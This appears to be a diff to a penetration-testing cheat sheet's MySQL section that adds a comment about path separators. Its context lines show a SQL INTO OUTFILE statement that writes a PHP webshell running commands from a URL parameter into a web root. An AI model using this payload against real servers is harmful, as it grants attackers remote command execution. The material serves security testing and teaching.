@@ -52,6 +52,7 @@ show databases;, use <database>;, show tables;, show columns from <table>;, sele
 * #### Write Local Files <a href="#write-local-files" id="write-local-files"></a>
   * <pre class="language-sql" data-line-numbers><code class="lang-sql">-- When 'secure_file_priv' is not set
     show variables like "secure_file_priv";
+    -- Use always '/' irrespective of OS
     SELECT "&#x3C;?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
     </code></pre>
 * #### Read Local Files
